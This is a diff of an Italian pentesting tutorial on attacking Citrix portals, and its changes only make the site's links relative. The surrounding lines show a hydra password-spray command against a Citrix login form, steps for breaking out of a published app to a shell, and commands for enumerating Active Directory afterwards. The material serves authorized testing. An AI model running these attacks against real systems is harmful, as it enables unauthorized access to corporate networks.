@@ -119,7 +119,7 @@ hydra -L ad_users.txt -p 'Spring2026!' https-post-form \
   "https://10.10.10.90/Citrix/Authentication/ExplicitForms/Login:username=^USER^&password=^PASS^:incorrect"
 ```
 
-**Cosa fai dopo:** credenziali valide → login al portale → lancio applicazione pubblicata → sessione ICA. Per il [password spray AD](https://hackita.it/articoli/brute-force/), le stesse credenziali funzionano su SMB, OWA, VPN.
+**Cosa fai dopo:** credenziali valide → login al portale → lancio applicazione pubblicata → sessione ICA. Per il [password spray AD](/articoli/brute-force/), le stesse credenziali funzionano su SMB, OWA, VPN.
 
 **Citrix breakout — da app pubblicata a shell**
 
@@ -160,7 +160,7 @@ Contesto: sei dentro una sessione Citrix con un'app limitata (es: Word, Excel, b
 3. Da lì: cerca di aprire Control Panel → link → shell
 ```
 
-**Cosa fai dopo:** shell CMD/PowerShell sul server Citrix. Da qui: `whoami /groups` per verificare privilegi, `net user /domain` per enumerare AD, pivot verso la [rete interna](https://hackita.it/articoli/active-directory/).
+**Cosa fai dopo:** shell CMD/PowerShell sul server Citrix. Da qui: `whoami /groups` per verificare privilegi, `net user /domain` per enumerare AD, pivot verso la [rete interna](/articoli/active-directory/).
 
 **Post-breakout enumeration**
 
@@ -246,4 +246,4 @@ Citrix è usato da migliaia di enterprise per remote access. Un portale Citrix e
 
 Riferimento: Citrix documentation, CVE-2023-3519, CVE-2023-4966. Uso esclusivo in ambienti autorizzati.
 
-> [hackita.it/supporto](https://hackita.it/supporto) — [hackita.it/servizi](https://hackita.it/servizi).
+> [hackita.it/supporto](/supporto) — [hackita.it/servizi](/servizi).
